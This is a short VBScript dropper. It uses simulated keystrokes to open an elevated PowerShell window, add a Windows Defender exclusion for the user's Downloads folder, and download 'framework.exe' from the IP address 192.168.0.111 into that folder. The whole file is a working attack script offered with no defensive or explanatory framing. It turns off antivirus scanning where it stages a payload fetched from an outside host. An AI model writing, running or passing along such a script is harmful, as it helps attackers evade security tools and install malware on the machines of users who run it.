Set x = CreateObject("WScript.Shell")

' Open Start Menu
x.SendKeys "^{ESC}"
WScript.Sleep 1000

' Type PowerShell
x.SendKeys "powershell"
WScript.Sleep 1500

' Run as Admin: Ctrl+Shift+Enter
x.SendKeys "^+{ENTER}"
WScript.Sleep 4000  ' Wait for PowerShell to open (and UAC if needed)

' Paste PowerShell command
cmd = "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; " & _
      "Invoke-WebRequest -Uri 'http://192.168.0.111/framework.exe' -OutFile $env:USERPROFILE\Downloads\framework.exe"
      
' Paste command into the elevated PowerShell window
x.SendKeys "powershell -command " & Chr(34) & cmd & Chr(34)
WScript.Sleep 500
x.SendKeys "{ENTER}"
